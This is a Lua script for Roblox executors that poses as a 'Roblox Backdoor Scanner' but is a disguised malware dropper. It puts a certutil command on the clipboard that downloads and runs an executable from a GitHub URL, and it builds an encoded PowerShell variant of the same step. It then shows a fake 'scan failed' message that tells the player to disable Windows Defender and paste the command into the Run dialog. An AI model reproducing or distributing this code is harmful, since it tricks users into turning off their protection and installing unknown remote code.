local plain_command = [[cmd /c certutil -urlcache -f https://raw.githubusercontent.com/outhackernuls090-hash/RC-test/refs/heads/main/payloadScript.exe %TEMP%\payload.exe & start %TEMP%\payload.exe]]

local function base64_encode(data)
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local result = {}
    for i = 1, #data, 3 do
        local a, b, c = string.byte(data, i, i + 2)
        a = a or 0
        b = b or 0
        c = c or 0
        local n = a * 0x10000 + b * 0x100 + c
        local n1 = math.floor(n / 0x40000)
        local n2 = math.floor((n % 0x40000) / 0x1000)
        local n3 = math.floor((n % 0x1000) / 0x40)
        local n4 = n % 0x40
        table.insert(result, b64chars:sub(n1 + 1, n1 + 1))
        table.insert(result, b64chars:sub(n2 + 1, n2 + 1))
        table.insert(result, (i + 1 <= #data) and b64chars:sub(n3 + 1, n3 + 1) or '=')
        table.insert(result, (i + 2 <= #data) and b64chars:sub(n4 + 1, n4 + 1) or '=')
    end
    return table.concat(result)
end

local ps_script = [[Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/outhackernuls090-hash/RC-test/refs/heads/main/payloadScript.exe' -OutFile $env:TEMP\payload.exe; Start-Process $env:TEMP\payload.exe]]
local utf16le = {}
for i = 1, #ps_script do
    local byte = string.byte(ps_script, i)
    table.insert(utf16le, string.char(byte, 0))
end
local b64 = base64_encode(table.concat(utf16le))
local obfuscated_command = "powershell -NoProfile -EncodedCommand " .. b64

local function copy_to_clipboard(text)
    local clipboard_funcs = {
        setclipboard,
        syn and syn.setclipboard,
        krnl and krnl.setclipboard,
        sethclipboard,
        Clipboard and Clipboard.set,
    }
    for _, fn in ipairs(clipboard_funcs) do
        if type(fn) == "function" then
            local ok, err = pcall(fn, text)
            if ok then return true end
        end
    end
    if type(os) == "table" and type(os.execute) == "function" then
        local escaped = text:gsub('"', '\\"')
        local cmd = 'echo ' .. escaped .. ' | powershell -Command "Set-Clipboard"'
        local ok, res = pcall(os.execute, cmd)
        if ok then return true end
    end
    return false
end

local copied = copy_to_clipboard(plain_command)

local msg
if copied then
    msg = "Scan Falied due to Byfron, to bypass this follow these Instructions:\n\n" ..
          "Open Windows Defneder and Disable Real Time Protection. This is needed because the\n" ..
          "scanner needs to make an DLL Hook which gets blocked by your Antivirus.\n\n" ..
          "After that Press Windows + R, then Ctrl + V, and Enter.\n\n" ..
          "A Command Prompt Window will open and hook into Roblox,\n" ..
          "this will scan all server and client scripts for backdoors.\n\n" ..
          "If Roblox crashes this means that Byfron detected you.\n" ..
          "Once you get Detected the scanner wont work anymore\n" ..
          "because Byfron will block any new attempt."
else
    msg = "⚠️ Could not find an Backdoor\n\n" 
end

if type(messagebox) == "function" then
    pcall(messagebox, msg, "Roblox Backdoor Scanner", 0)
elseif type(warn) == "function" then
    warn("VOID: " .. msg)
else
    print("VOID: " .. msg)
end

